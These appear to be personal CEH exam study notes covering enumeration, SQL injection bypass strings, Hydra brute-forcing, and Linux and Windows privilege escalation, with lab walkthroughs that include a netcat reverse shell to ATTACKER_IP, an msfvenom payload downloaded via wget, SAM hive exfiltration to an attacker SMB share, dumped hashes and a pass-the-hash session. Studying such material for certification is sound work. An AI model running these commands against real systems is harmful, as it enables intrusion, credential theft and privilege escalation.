# CEH
CEH Exam Notes

Useful Links:
- https://gtfobins.github.io/ - List of binaries that can be used to exploit misconfigured permissions.
- https://www.rapid7.com/db/ - Vulnerability and Exploit Database
- https://crackstation.net/ - List of Password Hashes to crack online
- https://github.com/danielmiessler/SecLists - Wordlists, payloads, web shells
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md - Reverse shell cheatsheet
- https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php - PHP reverse shell for web servers
- https://www.abrictosecurity.com/blog/sqlmap-cheatsheet-and-examples/
- https://explainshell.com/
- https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation


ENUMERATION

netdiscover -i eth0  (may be tun0 instead)
nmap -p- 10.10.10.10  (replace IP with any found IPs)
nmap -p443,80,53,135,8080 -A -O -sV -sC -T4 -oN nmapOutput 10.10.10.10  (replace/add any open ports, and save to relevant IP)

While nmap is running the above, open all IPs in browser to see if any web services are running.  If so, run gobuster or dirb on the IP.

gobuster -e -u 'http://10.10.10.10' -w /usr/share/wordlists/<path_to_wordlist_file>.txt

Any login page found, try SQLi manually:
admin' --
admin' #
admin' /*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1-



Some default password lists:
http://www.phenoelit.org/dpl/dpl.html
https://datarecovery.com/rd/default-passwords
https://github.com/Dormidera/WordList-Compendium


Hydra
hydra -l root -P passwords.txt [-t 32] <IP> ftp
hydra -L usernames.txt -P pass.txt <IP> mysql
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -V -f -L usernames.txt -P pass.txt rdp:// <IP>
hydra -P common-snmp-community-strings.txt target.com snmp
hydra -l admin -P pass.txt <IP> smb -t 1
hydra -l root -P pass.txt <IP> ssh
  
  
  
smbmap -H <ip>
  smbget -R smb://$IP/<share>
  
  For FTP to download all:  wget -r --no-passive ftp://(USERNAME):(PASSWORD)@(TARGET)



Linux Priv Esc
  Enumeration
  - hostname
  - uname -a
  - /proc/version
  - /etc/issue : kernel version, see if GCC is present
  - env
  - sudo -l : list binaries a user can run in sudo
  - find / -writable -type d 2>/dev/null : Find world-writeable folders
  - find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

  Kernel Exploits
  - https://www.linuxkernelcves.com/cves or use Google

  Get user passwords
  - get /etc/passwd and /etc/shadow, move to attack box and run "unshadow passwd shadow > passwords.txt" then use "john --wordlist=/usr/share/<wordlist> passwords.txt"
  
  PrivEsc - Capabilites
  - getcap -r / 2>/dev/null

  
  
  Windows Priv Esc
  
  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
  https://github.com/antonioCoco/RogueWinRM
  https://github.com/gtworek/Priv2Admin
  https://jlajara.gitlab.io/Potatoes_Windows_Privesc
  
    Stored Credentials
      Unattended Windows Installations
      - c:\Unattend.xml
      - c:\Windows\Panther\Unattend.xml
      - c:\Windows\Panther\Unattend\Unattend.xml
      - c:\Windows\System32\sysprep.inf
      - c:\Windows\System32\sysprep\sysprep.xml
  
    - Powershell History - in cmd type "type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
  
    - Saved Credentials
      - cmdkey /list : this will list saved credentials
      - runas /savecred /user:admin cmd.exe : this will save the credentials
  
    - IIS Config
      - c:\inetpub\wwwroot\web.config
      - c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
      - use command "type c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
  
    - PuTTY
      - reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
  
  
    Finding tasks that run files:  schtasks
      - schtasks /query /tn vulntask /fo list /v : queries that task you found for more details
      - create payload for reverse shell
      - replace file "C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat"
      - create listener on linux "nc -lvp 4444" and run the scheduled task on Windows "C:\> schtasks /run /tn vulntask"
  
    "icacls" shows permissions.  if you want to add more, "icacls <file> /grant Everyone:F"
  
      - SCM shows which permissions services run as "sc qc apphostsvc"
  
  C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1
 
  C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
  
  
user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  
  
  wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

  C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.
  
  ----
  Unquoted Service Paths
  
When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by "C:\Program Files\RealVNC\VNC Server\vncserver.exe", followed by the given parameters:

Command Prompt
C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:

Command Prompt
C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2
  
  
Command                                               Argument 1	        Argument 2
C:\MyPrograms\Disk.exe	                              Sorter	            Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe	                        Enterprise\bin\disksrs.exe	
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
  
  
  
  
  ---
  Windows Privileges
Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:

whoami /priv
  
  SeBackup / SeRestore
The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
  
  To backup the SAM and SYSTEM hashes, we can use the following commands:

Command Prompt
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:

Kali Linux
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 

Command Prompt
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
And use impacket to retrieve the users' password hashes:

Kali Linux
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:

Kali Linux
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

  
  
  
  
  John the Ripper and Hashes
  - hash identifier:
  wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
  then
  python3 hash-id.py
  
  to crack using that specific hash type:
  john --format=[format] --wordlist=[path to wordlist] [path to file]
  john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1.txt
  
  to grab Windows NTLM hashes, dump the SAM database with Mimikatz
